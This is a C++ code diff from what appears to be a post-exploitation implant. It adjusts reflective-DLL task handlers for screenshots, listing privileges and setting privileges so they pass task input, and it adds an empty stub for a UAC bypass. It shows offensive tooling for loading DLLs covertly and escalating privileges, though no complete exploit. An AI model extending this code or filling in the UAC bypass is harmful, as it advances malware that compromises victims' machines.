@@ -25,7 +25,7 @@
 // Function typedefs
 typedef UINT_PTR(WINAPI* RDI)();
 typedef const char* (__cdecl* SCRNSHOTTASK)(); // For screenshot ExecuteW
-typedef LPWSTR(__cdecl* LPW)();     // For listprivs ExecuteW
+typedef LPWSTR(__cdecl* LPW)(LPCWSTR, DWORD);     // For listprivs ExecuteW
 
 // Get exported function address manually from loaded DLL
 FARPROC GetProcAddressR(HMODULE hModule, LPCSTR lpProcName)
@@ -278,7 +278,7 @@ int load_execute_ss(std::string& dll, std::wstring& out)
 	PRINTF("[+] Calling ExecuteW to get screenshot (wstring)...\n");
 	try {
 		LPW exportedFunction = (LPW)fn;
-		LPWSTR lpsz = exportedFunction();
+		LPWSTR lpsz = exportedFunction(L"", 0);
 		out = std::wstring(lpsz);
 	}
 	catch (...) {
@@ -314,7 +314,7 @@ int load_execute_listprivs(std::string& dll, std::string& out)
 	PRINTF("[+] Calling ExecuteW to get listprivs...\n");
 	try {
 		LPW exportedFunction = (LPW)fn;
-		LPWSTR lpsz = exportedFunction();
+		LPWSTR lpsz = exportedFunction(L"", 0);
 		if (lpsz) {
 			out = CW2A(lpsz);
 			LocalFree(lpsz);
@@ -331,10 +331,10 @@ int load_execute_listprivs(std::string& dll, std::string& out)
 	return 0;
 }
 
-int load_execute_setpriv(std::string& dll, std::string& out) {
+int load_execute_setpriv(std::string& dll, std::string& taskinput, std::string& out) {
 	HMODULE hDLL = loadDll(dll);
 	if (!hDLL) {
-		PRINTF("[-] loadDll failed in load_execute_listprivs.\n");
+		PRINTF("[-] loadDll failed in load_execute_setpriv.\n");
 		return -1;
 	}
 
@@ -349,7 +349,8 @@ int load_execute_setpriv(std::string& dll, std::string& out) {
 	PRINTF("[+] Calling ExecuteW to get listprivs...\n");
 	try {
 		LPW exportedFunction = (LPW)fn;
-		LPWSTR lpsz = exportedFunction();
+		std::wstring privset = toWstring(taskinput);
+		LPWSTR lpsz = exportedFunction(privset.c_str(), (DWORD)privset.size());
 		if (lpsz) {
 			out = CW2A(lpsz);
 			LocalFree(lpsz);
@@ -364,4 +365,10 @@ int load_execute_setpriv(std::string& dll, std::string& out) {
 
 	FreeLibrary(hDLL);
 	return 0;
+}
+
+int load_execute_bypassUAC(std::string& dll, std::string& out) {
+	// Similar structure to the above functions, but calls a different exported function for UAC bypass
+	// Implementation would depend on the specific function exported by the DLL for UAC bypass
+	return 0; // Placeholder return value
 }
